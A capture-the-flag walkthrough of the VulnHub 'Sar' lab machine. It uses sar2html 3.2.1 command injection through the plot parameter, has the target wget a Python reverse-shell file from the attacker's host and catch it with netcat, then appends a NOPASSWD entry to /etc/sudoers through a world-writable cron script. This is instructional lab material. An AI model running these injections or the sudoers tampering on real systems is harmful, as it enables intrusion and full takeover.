# Sar | VulnHub
https://www.vulnhub.com/entry/sar-1,425/

### 1. Scan
```bash
Nmap scan report for 192.168.34.153
Host is up, received arp-response (0.0018s latency).
Scanned at 2021-07-17 01:06:04 EDT for 13s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:5D:14:AD (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/17%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=60F
OS:26549%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.261 days (since Fri Jul 16 18:51:01 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.76 ms 192.168.34.153

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 17 01:06:17 2021 -- 1 IP address (1 host up) scanned in 17.06 seconds
```
The machine is running an Apache server on port 80.

### 2. Enumeration
Check robots.txt.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl http://192.168.34.153/robots.txt                                                          
sar2HTML
```
At http://192.168.34.153/sar2HTML/ is an instance of the sar2html web app, version 3.2.1. Looks to be some sort of tool which generates server reports.  
Since the version is known, check for exploits.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit sar2html
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution          | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution              | php/webapps/47204.txt
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Cool.

### 3. Test the sar2HTML exploit
The exploit route isn't too difficult to reproduce.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit -x 47204 | cat
  Exploit: Sar2HTML 3.2.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47204
     Path: /usr/share/exploitdb/exploits/php/webapps/47204.txt
File Type: ASCII text, with CRLF line terminators

# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

So just curl with URL with the right parameter.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.153/sar2HTML/index.php?plot=;id' -s | grep www-data
<div style="height:100px; vertical-align: top;"><form METHOD=POST ACTION="index.php"><input type="hidden" name="plot" value=";id"><select class="select_text" name=host onchange="this.form.submit();"><option value=null selected>Select Host</option><option value=There is no defined host...>There is no defined host...</option><option value=uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The command output is there.

### 4. Get a shell
To get a shell, firstly create a python file with some reverse shell code in it and host it.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ vim rev.py                    
                                                                                                                              
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Retrieve the file using the exploit and then run it with a listener open.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.153/sar2HTML/index.php?plot=;wget%20http://192.168.34.138/rev.py'
        <html>
        <head>
...
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.153/sar2HTML/index.php?plot=;python3%20rev.py'
```

The shell opens in the listener.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.153] 46742
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5. Enumerate from foothold
There is only one other user on the machine besides root with a bash shell, the user "love". There are also some readable files in the user's home directory.
```bash
www-data@sar:/var/www/html/sar2HTML$ cat /etc/passwd | grep bash 
root:x:0:0:root:/root:/bin/bash
love:x:1000:1000:love,,,:/home/love:/bin/bash
www-data@sar:/var/www/html/sar2HTML$ cd /home
www-data@sar:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 20  2019 .
drwxr-xr-x 24 root root 4096 Oct 20  2019 ..
drwxr-xr-x 17 love love 4096 Oct 21  2019 love
www-data@sar:/home$ cd love
www-data@sar:/home/love$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
www-data@sar:/home/love$ ls Desktop
user.txt
www-data@sar:/home/love$ cat Desktop/user.txt
```

Looking at the universal crontab, there is one job running a script every 5 mins as root. It's not writable by any user other than root.
```bash
www-data@sar:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
www-data@sar:/tmp$ ls -l /var/www/html/finally.sh 
-rwxr-xr-x 1 root root 22 Oct 20  2019 /var/www/html/finally.sh
www-data@sar:/tmp$ cat /var/www/html/finally.sh 
#!/bin/sh

./write.sh
```

The script calls "write.sh" in the same directory.
```bash
www-data@sar:/tmp$ cat /var/www/html/write.sh
#!/bin/sh

touch /tmp/gateway
www-data@sar:/tmp$ ls -l /var/www/html/write.sh 
-rwxrwxrwx 1 www-data www-data 30 Oct 21  2019 /var/www/html/write.sh
```
This one is world writable.

### 6. Escalate to root
Using nano, add a line to the cron job which will append a line to the /etc/sudoers file, allowing the www-data user to escalate to root without a password.
```language
www-data@sar:/tmp$ nano /var/www/html/write.sh
www-data@sar:/tmp$ cat /var/www/html/write.sh   
#!/bin/sh

touch /tmp/gateway
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

Wait 5 minutes, then start an interactive session as root.
```bash
www-data@sar:/tmp$ sudo -i
root@sar:~# whoami 
root
```